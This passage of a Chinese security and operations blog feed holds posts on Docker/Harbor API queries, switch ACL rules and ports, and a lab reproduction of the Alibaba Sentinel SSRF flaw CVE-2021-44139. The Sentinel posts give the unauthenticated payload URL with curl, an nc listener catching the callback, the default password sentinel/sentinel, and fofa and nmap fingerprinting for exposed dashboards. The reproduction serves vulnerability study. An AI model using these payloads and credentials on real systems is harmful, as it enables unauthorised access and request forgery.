class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654355000&amp;endTime=1708654361000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">04.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654362000&amp;endTime=1708654368000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654369000&amp;endTime=1708654375000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654376000&amp;endTime=1708654382000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><br></code></pre></td></tr></table></figure><h3 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h3><p>检查 控制台-&gt;机器列表中是否存在未知异常的机器信息</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Report a Sentinel Security Vulnerability about SSRF #2451 threedr3am Nov 18, 2021<br>链接：<a href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p><p>[2] Alibaba Sentinel SSRF漏洞(CVE-2021-44139)浅析 ordar 2022-08-30</p><p>链接：<a href="https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>weakpassword</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>telnet_weak_password</title>
    <link href="/2024/03/04/security/secvulns/telnet/telnet_weak_password/"/>
    <url>/2024/03/04/security/secvulns/telnet/telnet_weak_password/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>weakpassword</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_tips</title>
    <link href="/2024/02/28/yunwei/applications/docker/docker_tips/"/>
    <url>/2024/02/28/yunwei/applications/docker/docker_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h3 id="查询指定镜像仓库镜像列表"><a href="#查询指定镜像仓库镜像列表" class="headerlink" title="查询指定镜像仓库镜像列表"></a>查询指定镜像仓库镜像列表</h3><p><strong>Curl</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">curl -X <span class="hljs-symbol">&#x27;GET</span><span class="hljs-string">&#x27; &#x27;</span>h__ps://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=<span class="hljs-literal">true</span>&#x27;  -H <span class="hljs-symbol">&#x27;accept</span>: application/json&#x27;<br></code></pre></td></tr></table></figure><p><strong>Request URL</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=true<br></code></pre></td></tr></table></figure><p>q&#x3D;string   </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">格式<span class="hljs-attribute">q</span>=k=v <br><span class="hljs-attribute">q</span>=name=admin 精确匹配<br><span class="hljs-attribute">q</span>=name=~admin 模糊匹配<br></code></pre></td></tr></table></figure><p>q&#x3D;name&#x3D;admin</p><p>page&#x3D;interger</p><p>page_size&#x3D;interger</p><p>name&#x3D;string 指定项目</p><p>sort&#x3D;string  指定排序字段</p><p>public&#x3D;boolean  指定查询公开项目还是私有项目，默认公开项目</p><p>owner&#x3D;string  指定作者</p><p>with_detail&#x3D;boolean  指定是否需要展示详情</p><h3 id="查询指定镜像仓库指定镜像"><a href="#查询指定镜像仓库指定镜像" class="headerlink" title="查询指定镜像仓库指定镜像"></a>查询指定镜像仓库指定镜像</h3><p><strong>CURL</strong></p><p>curl -X ‘GET’ ‘h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1’ -H ‘accept: application&#x2F;json’</p><p><strong>Request URL</strong></p><p>h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>switch_rules</title>
    <link href="/2024/02/26/yunwei/switch/switch_rules/"/>
    <url>/2024/02/26/yunwei/switch/switch_rules/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>基本ACL支持根据源IP地址过滤报文，高级ACL不仅支持源IP地址，还支持根据目的IP地址过滤报文</p><p>策略执行顺序</p><p>从上往下</p><p>首次匹配</p><p>一旦有规则匹配到了数据包，交换机就会执行该规则指定的操作，并停止继续检查其他规则。这意味着如果ACL中的某个规则匹配了数据包，后面的规则就不会再被考虑。</p><p>默认策略</p><p>如果数据包没有匹配到任何ACL策略，交换机会按照默认策略处理，也就是需要在策略最后添加默认允许或默认拒绝</p><p>格式</p><p>access-list &lt;编号&gt; &lt;策略&gt; &lt;协议&gt; &lt;源地址&gt; &lt;源地址掩码&gt; &lt;目标地址&gt; &lt;目标地址掩码&gt; [&lt;源端口&gt; &lt;目标端口&gt; ]</p><p>语法</p><p>必须</p><p>access-list: 表示创建或编辑ACL规则</p><p>编号：ACL编号，用于区分不同的ACL规则，（范围通常为100-199（扩展ACL）或2000-2699（基于时间的ACL））需要确认的点</p><p>策略：指定访问控制的行为，包含permit（允许）和 deny （拒绝）两种策略</p><p>协议：指定需要匹配的协议类型，例如TCP、UDP、ICMP、IP（表示任何IP层协议，协议号的取值可以是1~255）等</p><p>源地址：指定访问控制来源IP地址</p><p>源地址掩码：指定访问控制来源IP地址的子网范围</p><p>目标地址：指定访问控制目的IP地址</p><p>目标地址掩码：指定访问控制目的IP地址的子网范围</p><p>可选</p><p>源端口  目标端口 ：TCP和UDP协议支持指定端口，比较符 eq port 等于，gt port 大于，lt port 小于，range startport endport 端口范围</p><p>可以写具体端口，也可以写常用服务（www）</p><p>常见TCP端口对应字符串</p><table><thead><tr><th><strong>端口号</strong></th><th><strong>字符串</strong></th><th><strong>协议</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>7</td><td>echo</td><td>Echo</td><td>计算机命令</td></tr><tr><td>9</td><td>discard</td><td>Discard</td><td>用于连接测试的空服务</td></tr><tr><td>13</td><td>daytime</td><td>Daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>19</td><td>CHARgen</td><td>Character generator</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP data connections</td><td>FTP数据端口</td></tr><tr><td>21</td><td>ftp</td><td>File Transfer Protocol(FTP)</td><td>文件传输协议（FTP）端口</td></tr><tr><td>23</td><td>telnet</td><td>Telnet</td><td>Telnet服务</td></tr><tr><td>25</td><td>smtp</td><td>Simple Mail Transport Protocol(SMTP)</td><td>简单邮件传输协议</td></tr><tr><td>37</td><td>time</td><td>Time</td><td>时间协议</td></tr><tr><td>43</td><td>whois</td><td>Nickname（WHOIS）</td><td>目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>TAC Access Control System (TACACS)</td><td>用于基于TCP&#x2F;IP验证和访问的访问控制系统（TACACS登录主机协议）</td></tr><tr><td>53</td><td>domain</td><td>Domain Name Service(DNS)</td><td>域名服务</td></tr><tr><td>70</td><td>gopher</td><td>Gopher</td><td>信息检索协议（互联网文档搜寻和检索）</td></tr><tr><td>79</td><td>finger</td><td>Finger</td><td>用于用户联系信息的Finger服务，查询远程主机在线用户等信息</td></tr><tr><td>80</td><td>www</td><td>World Wide Web(HTTP)</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP），用于网页浏览</td></tr><tr><td>101</td><td>hostname</td><td>NIC hostname server</td><td>NIC机器上的主机名服务</td></tr><tr><td>109</td><td>pop2</td><td>Post Office Protocol v2</td><td>邮件协议-版本2</td></tr><tr><td>110</td><td>pop3</td><td>Post Office Protocol v3</td><td>邮件协议-版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>Sun Remote Procedure Call (RPC)</td><td>SUN公司的远程过程调用（RPC）协议，用于远程命令执行，被网络文件系统（NFS）使用</td></tr><tr><td>119</td><td>nntp</td><td>Network News Transport Protocol(NNTP)</td><td>网络新闻传输协议，承载USENET通信</td></tr><tr><td>179</td><td>bgp</td><td>Border Gateway Protocol (BGP)</td><td>边界网关协议</td></tr><tr><td>194</td><td>irc</td><td>Internet Relay Chat(IRC)</td><td>互联网中继聊天（多线交谈协议）</td></tr><tr><td>512</td><td>exec</td><td>Exec (rsh)</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>513</td><td>login</td><td>Login (rlogin)</td><td>远程登录</td></tr><tr><td>514</td><td>cmd</td><td>Remote commands</td><td>远程命令，不必登录的远程shell（rshell）和远程复制（rcp）</td></tr><tr><td>515</td><td>lpd</td><td>Printer service</td><td>打印机（lpr）假脱机</td></tr><tr><td>517</td><td>talk</td><td>Talk</td><td>远程对话服务和客户</td></tr><tr><td>540</td><td>uucp</td><td>Unix-to-Unix Copy Program</td><td>Unix到Unix复制服务</td></tr><tr><td>543</td><td>klogin</td><td>Kerberos login</td><td>Kerberos版本5 （v5）远程登录</td></tr><tr><td>544</td><td>kshell</td><td>Kerberos shell</td><td>Kerberos版本5 （v5）远程shell</td></tr></tbody></table><p>常见UDP端口对应字符串</p><table><thead><tr><th>端口号</th><th>字符串</th><th>协议</th><th>说明</th></tr></thead><tbody><tr><td>7</td><td>echo</td><td>Echo</td><td>计算机命令</td></tr><tr><td>9</td><td>discard</td><td>Discard</td><td>用于连接测试的空服务</td></tr><tr><td>37</td><td>time</td><td>Time</td><td>时间协议</td></tr><tr><td>42</td><td>nameserver</td><td>Host Name Server</td><td>主机名服务</td></tr><tr><td>53</td><td>dns</td><td>Domain Name Service (DNS)</td><td>域名服务</td></tr><tr><td>65</td><td>tacacs-ds</td><td>TACACS-Database Service</td><td>TACACS数据库服务</td></tr><tr><td>67</td><td>bootps</td><td>Bootstrap Protocol Server</td><td>引导程序协议 （BOOTP）服务端， DHCP服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap Protocol Client</td><td>引导程序协议 （BOOTP）客户端， DHCP客户使用</td></tr><tr><td>69</td><td>tftp</td><td>Trivial File Transfer Protocol (TFTP)</td><td>小文件传输协议</td></tr><tr><td>90</td><td>dnsix</td><td>DNSIX Security Attribute Token Map</td><td>DNSIX安全属性标记图</td></tr><tr><td>111</td><td>sunrpc</td><td>SUN Remote Procedure Call (SUN RPC)</td><td>SUN公司的远程过程调用（RPC）协议， 用于远程命令执行， 被网络文件系统（NFS）使用</td></tr><tr><td>123</td><td>ntp</td><td>Network Time Protocol (NTP)</td><td>网络时间协议，蠕虫病毒会利用</td></tr><tr><td>137</td><td>netbios-ns</td><td>NETBIOS Name Service</td><td>NETBIOS名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>NETBIOS Datagram Service</td><td>NETBIOS数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>NETBIOS Session Service</td><td>NETBIOS会话服务</td></tr><tr><td>161</td><td>snmp</td><td>SNMP</td><td>简单网络管理协议</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMPTRAP</td><td>SNMP陷阱</td></tr><tr><td>177</td><td>xdmcp</td><td>X Display Manager Control Protocol (XDMCP)</td><td>X显示管理器控制协议</td></tr><tr><td>434</td><td>mobilip-ag</td><td>MobileIP-Agent</td><td>移动IP代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>MobileIP-MN</td><td>移动IP管理</td></tr><tr><td>512</td><td>biff</td><td>Mail notify</td><td>异步邮件，可用来通知用户有邮件到达</td></tr><tr><td>513</td><td>who</td><td>Who</td><td>登录的用户列表</td></tr><tr><td>514</td><td>syslog</td><td>Syslog</td><td>UNIX系统日志服务</td></tr><tr><td>517</td><td>talk</td><td>Talk</td><td>远程对话服务器和客户端</td></tr><tr><td>520</td><td>rip</td><td>Routing Information Protocol</td><td>RIP路由协议</td></tr></tbody></table><p>掩码说明</p><p>IP地址通配符掩码与IP地址的反向子网掩码类似，也是一个32比特位的数字字符串，用于指示IP地址中的哪些位将被检查。各比特位中，“0”表示“检查相应的位”，“1”表示“不检查相应的位”，概括为一句话就是“检查0，忽略1”。但与IP地址子网掩码不同的是，子网掩码中的“0”和“1”要求必须连续，而通配符掩码中的“0”和“1”可以不连续。</p><p>通配符掩码可以为0，相当于0.0.0.0，表示源&#x2F;目的地址为主机地址；也可以为255.255.255.255，表示任意IP地址，相当于指定<strong>any</strong>参数</p><p>例如：</p><p>匹配 192.168.1.0&#x2F;24 ，可以写为 192.168.1.0 0.0.0.255，也就是只检查前24个比特位</p><p>实例：</p><p>允许特定源、目的IP之间 3306 端口的TCP流量</p><p>rule 5 permit tcp source 10.122.1.1 0 destination 172.16.1.1 0 destination-port eq 3306</p><p>规则编号：rule 5</p><p>策略：permit（允许）</p><p>协议：TCP</p><p>源地址：10.122.1.1</p><p>源地址掩码：0  通配符掩码，0表示必须精确匹配源地址</p><p>目标地址：172.16.1.1 </p><p>目的地址掩码：0  通配符掩码，0表示必须精确匹配目标地址</p><p>目标端口：eq（等于） 3306</p><p>允许ICMP协议数据包通过</p><p>rule 500 permit icmp</p><p>允许ICMP Echo请求数据包通过</p><p>rule 501 permit icmp icmp-type echo</p><p>允许ICMP Echo Reply 响应数据包通过，ICMP Echo Reply 是对 ICMP Echo 请求的响应，用于确认网络连接和诊断网络延迟</p><p>rule 502 permit icmp icmp-type echo-reply </p><p>允许ICMP port-unreachable 数据包通过，即目标端口不可达时，主机会发送 ICMP port-unreachable 消息作为响应</p><p>rule 503 permit icmp icmp-type port-unreachable </p><p>允许ICMP ttl-exceeded 数据包通过，即数据包TTL（Time to Live）字段减到0时，路由器会丢弃该数据包，并向源主机发送ICMP ttl-exceeded数据包</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>switch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>switch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>alibaba_Sentinel_base</title>
    <link href="/2024/02/21/security/secvulns/alibaba%20Sentinel/alibaba_Sentinel_base/"/>
    <url>/2024/02/21/security/secvulns/alibaba%20Sentinel/alibaba_Sentinel_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>默认端口：8080</p><p>默认密码 sentinel&#x2F;sentinel</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alibaba_Sentinel_SSRF_CVE-2021-44139</title>
    <link href="/2024/02/21/security/secvulns/alibaba%20Sentinel/Alibaba_Sentinel_SSRF_CVE-2021-44139/"/>
    <url>/2024/02/21/security/secvulns/alibaba%20Sentinel/Alibaba_Sentinel_SSRF_CVE-2021-44139/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>alibaba hashicorp sentinel 服务端请求伪造（ssrf）</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Alibaba开源限流熔断组件Sentinel中的管控平台sentinel-dashboard存在认证前SSRF漏洞，恶意用户无需认证即可通过该接口进行SSRF攻击。</p><h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2021-44139</p><h2 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h2><p>高危</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>1.8.2版本</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级到最新版本</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>1、下载 1.8.2 版本jar包</p><p>首页-&gt;Tags-&gt;1.8.2</p><p>h__ps:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;Sentinel&#x2F;releases&#x2F;tag&#x2F;1.8.2</p><p>2、启动服务</p><p>java -jar sentinel-dashboard-1.8.2.jar</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  Alibaba_Sentinel_SSRF_CVE-2021-44139 java -jar sentinel-dashboard-1.8.2.jar<br>INFO: Sentinel log output type is: file<br>INFO: Sentinel log charset is: utf-8<br>INFO: Sentinel log base directory is: /Users/admin/logs/csp/<br>INFO: Sentinel log name use pid is: false<br><br>  .   ____          _            __ _ _<br> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \<br>( ( )\___ |<span class="hljs-string"> &#x27;_ </span>|<span class="hljs-string"> &#x27;_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> &#x27;_ \/ _` </span>|<span class="hljs-string"> \ \ \ \</span><br><span class="hljs-string"> \\/  ___)</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_)</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>||<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  ) ) ) )</span><br><span class="hljs-string">  &#x27;  </span>|<span class="hljs-string">____</span>|<span class="hljs-string"> .__</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_\__, </span>|<span class="hljs-string"> / / / /</span><br><span class="hljs-string"> =========</span>|<span class="hljs-string">_</span>|<span class="hljs-string">==============</span>|<span class="hljs-string">___/=/_/_/_/</span><br><span class="hljs-string"> :: Spring Boot ::        (v2.0.5.RELEASE)</span><br><span class="hljs-string"></span><br><span class="hljs-string">2024-02-22 19:48:59.528  INFO 6822 --- [           main] c.a.c.s.dashboard.DashboardApplication   : Starting DashboardApplication on 110.local with PID 6822 (/Users/admin/codes/vulncodes/Alibaba_Sentinel_SSRF_CVE-2021-44139/sentinel-dashboard-1.8.2.jar started by admin in /Users/admin/codes/vulncodes/Alibaba_Sentinel_SSRF_CVE-2021-44139)</span><br></code></pre></td></tr></table></figure><p>3、访问服务</p><p>默认端口 8080</p><p>h__p:&#x2F;&#x2F;10.222.28.10:8080&#x2F;#&#x2F;login</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、攻击主机 10.235.151.11（Windows） 监听 80 端口</p><p>nc64.exe -lp 80</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\nc\netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>&gt;nc64.exe -lp <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>2、构造Payload</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><p>ip 替换为被攻击主机，部署服务的主机 10.222.28.10</p><p>attackip 替换为攻击主机 10.235.151.11</p><p>h__p:&#x2F;&#x2F;10.222.28.10:8080&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;10.235.151.11&amp;port&#x3D;0</p><p>3、执行payload</p><p>10.222.28.10:8080&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;10.235.151.11&amp;port&#x3D;0</p><p>curl “<a href="http://10.222.28.10:8080/registry/machine?app=40bdb&appType=0&version=0&hostname=VbxGe&ip=10.235.151.11&port=0">http://10.222.28.10:8080/registry/machine?app=40bdb&amp;appType=0&amp;version=0&amp;hostname=VbxGe&amp;ip=10.235.151.11&amp;port=0</a>“</p><p>4、攻击结果</p><p>攻击主机监听的 80 会收到来自被攻击主机的请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\nc\netcat-win32-<span class="hljs-number">1</span>.<span class="hljs-number">12</span>&gt;nc64.exe -lp <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> /metric?startTime=<span class="hljs-number">1708654313000</span>&amp;endTime=<span class="hljs-number">1708654319000</span>&amp;refetch=false HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Connection</span>: Close<br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.235.151.11:0</span><br><span class="hljs-attribute">User</span>-Agent: Apache-HttpAsyncClient/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> (Java/<span class="hljs-number">11.0.15.1</span>)<br></code></pre></td></tr></table></figure><p>payload 访问结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;success&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;success&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h3><p>默认端口 8080</p><p>默认密码 sentinel&#x2F;sentinel</p><h3 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h3><p>title：Sentinel Dashboard</p><h3 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h3><h4 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h4><p>“title: Sentinel Dashboard”</p><h4 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h4><p>nmap -A 进行探测 ，SERVER 为 http-proxy ，页面中包含 “Sentinel Dashboard”</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-number">8080</span>   <br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span> ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-02-23 10:50 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-title function_">localhost</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>)<br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.00026</span>s <span class="hljs-variable">latency</span>).<br><br><span 